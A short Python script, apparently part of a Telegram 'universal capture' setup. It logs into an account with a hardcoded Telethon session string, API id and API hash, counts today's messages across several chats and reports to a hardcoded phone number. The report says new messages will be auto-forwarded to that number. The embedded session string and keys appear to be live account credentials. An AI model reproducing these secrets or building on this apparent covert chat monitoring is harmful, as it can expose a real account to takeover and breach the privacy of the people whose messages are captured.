#!/usr/bin/env python3
"""
Quick send today's messages to validation number
"""
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime, timedelta

# Your session
SESSION_STRING = "1AQAOMTQ5LjE1NC4xNzUuNTcBu2g+yaG4eWVh5epPtcgWfQTPkqasIdvsxCj68U7clUx9mn3LsVTRIXr/0xJoWABsu/2Khznce7EyhPh0wMw4aFTKllNmUA+iJsGib4sQfpd5dMcg0Ua3BR9JCx596L7qNzAhSda7R2grZFv5cnyx5oT39iXIA3edgHUpf0n+0XwfFFwK8oIqoJgPvoThCpwPit2iCXGM1LERLzssLErvGYzUeAklhKBvle3OJJRFPz4GQIkSRiVQLutLHHXUh3uLws7Pauq/fuhTbd8KxQ5987wcrXlwGI7iUOskQkc+vGlDuXUr3pgbsRHZ5qnIycCnWE3GhO/ns5OtXvJ8PbvkMjQ="
api_id = 29479443
api_hash = "e3a7a7226cf446bbfd5366f7da75cdfa"
VALIDATION_NUMBER = "+3212629156"

async def main():
    print("🚀 QUICK TODAY SENDER")

    client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
    await client.start()

    print("✅ Connected!")

    # Get today's date
    today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)

    # Quick check of accessible dialogs
    message_count = 0
    channels_checked = 0

    print("📋 Checking channels...")

    async for dialog in client.iter_dialogs(limit=20):
        try:
            channels_checked += 1

            # Get messages from today
            async for message in client.iter_messages(dialog, offset_date=datetime.now(), limit=10):
                if message.date < today:
                    break
                message_count += 1

            if channels_checked >= 10:  # Check first 10 channels
                break

        except:
            continue

    # Send quick summary
    summary = f"""🔥 QUICK TELEGRAM CHECK

📊 Status: {channels_checked} channels checked
📝 Found: {message_count} messages today
⏰ Time: {datetime.now().strftime('%H:%M:%S')}

🎯 Universal capture is RUNNING
💾 Ready to capture any new messages
📱 Will auto-forward to this number

✅ System is LIVE and monitoring!"""

    try:
        await client.send_message(VALIDATION_NUMBER, summary)
        print(f"📱 Summary sent to {VALIDATION_NUMBER}")
    except Exception as e:
        print(f"❌ Failed to send: {e}")

    await client.disconnect()
    print("✅ Done!")

if __name__ == "__main__":
    asyncio.run(main())